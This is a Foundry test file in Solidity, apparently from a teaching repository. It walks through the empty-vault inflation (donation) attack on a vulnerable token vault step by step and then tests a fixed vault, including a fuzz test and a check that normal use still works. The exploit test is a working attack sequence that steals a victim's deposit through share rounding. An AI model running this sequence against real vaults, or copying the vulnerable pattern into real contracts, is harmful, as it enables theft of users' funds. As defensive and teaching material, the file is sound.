// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {MockToken} from "../../src/01-empty-market-inflation/MockToken.sol";
import {VulnerableVault} from "../../src/01-empty-market-inflation/VulnerableVault.sol";
import {FixedVault} from "../../src/01-empty-market-inflation/FixedVault.sol";

/// @title Empty-market inflation (donation) attack: proof of concept and fix
/// @notice Run with: forge test --match-path test/01-empty-market-inflation/* -vv
contract EmptyMarketInflationTest is Test {
    MockToken token;
    VulnerableVault vulnerable;
    FixedVault fixedVault;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    uint256 constant DONATION = 10_000e18; // attacker's donation
    uint256 constant VICTIM_DEPOSIT = 10_000e18; // victim's honest deposit

    function setUp() public {
        token = new MockToken();
        vulnerable = new VulnerableVault(token);
        fixedVault = new FixedVault(token);

        token.mint(attacker, DONATION + 1);
        token.mint(victim, VICTIM_DEPOSIT);
    }

    /* ----------------------------------------------------------------------------------------- */
    /*                                  1. THE EXPLOIT                                           */
    /* ----------------------------------------------------------------------------------------- */

    /// @notice Attacker steals the victim's entire deposit from an empty vault.
    function test_exploit_victimLosesEntireDeposit() public {
        // Step 1: vault is empty. Attacker deposits 1 wei and receives the only share in existence.
        vm.startPrank(attacker);
        token.approve(address(vulnerable), type(uint256).max);
        vulnerable.deposit(1);
        assertEq(vulnerable.balanceOf(attacker), 1, "attacker should own the single share");

        // Step 2: attacker transfers tokens straight to the vault (a "donation", not a deposit).
        // No new shares are minted, so that one share is now worth 10,000 tokens + 1 wei.
        require(token.transfer(address(vulnerable), DONATION), "donation failed");
        vm.stopPrank();
        console2.log("price of 1 share after donation:", vulnerable.convertToAssets(1));

        // Step 3: victim deposits 10,000 tokens.
        // shares = 10_000e18 * 1 / (10_000e18 + 1) = 0.9999... -> rounds DOWN to 0.
        vm.startPrank(victim);
        token.approve(address(vulnerable), type(uint256).max);
        uint256 victimShares = vulnerable.deposit(VICTIM_DEPOSIT);
        vm.stopPrank();
        assertEq(victimShares, 0, "victim's deposit should round down to zero shares");

        // Step 4: attacker redeems their single share and takes everything in the vault.
        vm.prank(attacker);
        uint256 taken = vulnerable.redeem(1);

        uint256 attackerSpent = DONATION + 1;
        uint256 attackerProfit = taken - attackerSpent;

        console2.log("attacker spent     :", attackerSpent);
        console2.log("attacker took      :", taken);
        console2.log("attacker profit    :", attackerProfit);
        console2.log("victim balance now :", token.balanceOf(victim));

        assertEq(attackerProfit, VICTIM_DEPOSIT, "attacker profit equals the victim's whole deposit");
        assertEq(token.balanceOf(victim), 0, "victim is left with nothing");
        assertEq(vulnerable.balanceOf(victim), 0, "and holds no shares to redeem");
    }

    /* ----------------------------------------------------------------------------------------- */
    /*                                  2. THE FIX                                               */
    /* ----------------------------------------------------------------------------------------- */

    /// @notice Same attack against the fixed vault: the attacker loses money and the victim is safe.
    function test_fix_attackBecomesUnprofitable() public {
        vm.startPrank(attacker);
        token.approve(address(fixedVault), type(uint256).max);
        fixedVault.deposit(1);
        require(token.transfer(address(fixedVault), DONATION), "donation failed");
        vm.stopPrank();

        vm.startPrank(victim);
        token.approve(address(fixedVault), type(uint256).max);
        uint256 victimShares = fixedVault.deposit(VICTIM_DEPOSIT);
        vm.stopPrank();
        assertGt(victimShares, 0, "victim receives real shares");

        // read the balance BEFORE vm.prank: vm.prank only applies to the very next external call,
        // and fixedVault.balanceOf(...) inside the redeem(...) arguments would consume it first
        uint256 attackerShares = fixedVault.balanceOf(attacker);
        vm.prank(attacker);
        uint256 attackerBack = fixedVault.redeem(attackerShares);

        vm.prank(victim);
        uint256 victimBack = fixedVault.redeem(victimShares);

        console2.log("attacker spent :", DONATION + 1);
        console2.log("attacker back  :", attackerBack);
        console2.log("victim deposit :", VICTIM_DEPOSIT);
        console2.log("victim back    :", victimBack);

        assertLt(attackerBack, DONATION + 1, "attacker loses money attempting the attack");
        // victim recovers at least 99.9% of their deposit
        assertGe(victimBack, (VICTIM_DEPOSIT * 999) / 1000, "victim keeps essentially all of their deposit");
    }

    /// @notice If a donation is large enough to round a deposit to zero shares, the fixed vault
    ///         refuses the deposit instead of silently taking the victim's tokens.
    function test_fix_zeroShareDepositReverts() public {
        uint256 hugeDonation = 1e30;
        token.mint(attacker, hugeDonation);

        vm.startPrank(attacker);
        token.approve(address(fixedVault), type(uint256).max);
        fixedVault.deposit(1);
        require(token.transfer(address(fixedVault), hugeDonation), "donation failed");
        vm.stopPrank();

        vm.startPrank(victim);
        token.approve(address(fixedVault), type(uint256).max);
        vm.expectRevert(FixedVault.ZeroShares.selector);
        fixedVault.deposit(1e18);
        vm.stopPrank();

        assertEq(token.balanceOf(victim), VICTIM_DEPOSIT, "victim's tokens never left their wallet");
    }

    /// @notice Fuzz test: for ANY donation and deposit size, the attacker never profits on the fixed vault.
    function testFuzz_fix_attackerNeverProfits(uint256 donation, uint256 victimDeposit) public {
        donation = bound(donation, 1e18, 1e30);
        victimDeposit = bound(victimDeposit, 1e18, 1e24);

        token.mint(attacker, donation);
        token.mint(victim, victimDeposit);

        vm.startPrank(attacker);
        token.approve(address(fixedVault), type(uint256).max);
        fixedVault.deposit(1);
        require(token.transfer(address(fixedVault), donation), "donation failed");
        vm.stopPrank();

        vm.startPrank(victim);
        token.approve(address(fixedVault), type(uint256).max);
        if (fixedVault.convertToShares(victimDeposit) == 0) {
            // deposit would mint nothing: the fix makes it revert, victim keeps their tokens
            vm.expectRevert(FixedVault.ZeroShares.selector);
            fixedVault.deposit(victimDeposit);
            vm.stopPrank();
            return;
        }
        fixedVault.deposit(victimDeposit);
        vm.stopPrank();

        uint256 attackerShares = fixedVault.balanceOf(attacker);
        vm.prank(attacker);
        uint256 attackerBack = fixedVault.redeem(attackerShares);

        assertLe(attackerBack, donation + 1, "attacker must never get back more than they put in");
    }

    /* ----------------------------------------------------------------------------------------- */
    /*                              3. THE FIX DOESN'T BREAK NORMAL USE                          */
    /* ----------------------------------------------------------------------------------------- */

    /// @notice Honest users deposit and withdraw normally on the fixed vault.
    function test_fix_normalDepositAndRedeemStillWork() public {
        address alice = makeAddr("alice");
        address bob = makeAddr("bob");
        token.mint(alice, 1_000e18);
        token.mint(bob, 500e18);

        vm.startPrank(alice);
        token.approve(address(fixedVault), type(uint256).max);
        uint256 aliceShares = fixedVault.deposit(1_000e18);
        vm.stopPrank();

        vm.startPrank(bob);
        token.approve(address(fixedVault), type(uint256).max);
        uint256 bobShares = fixedVault.deposit(500e18);
        vm.stopPrank();

        vm.prank(alice);
        uint256 aliceBack = fixedVault.redeem(aliceShares);
        vm.prank(bob);
        uint256 bobBack = fixedVault.redeem(bobShares);

        // rounding can cost at most a few wei, never meaningful value
        assertApproxEqAbs(aliceBack, 1_000e18, 10, "alice gets her deposit back");
        assertApproxEqAbs(bobBack, 500e18, 10, "bob gets his deposit back");
    }
}
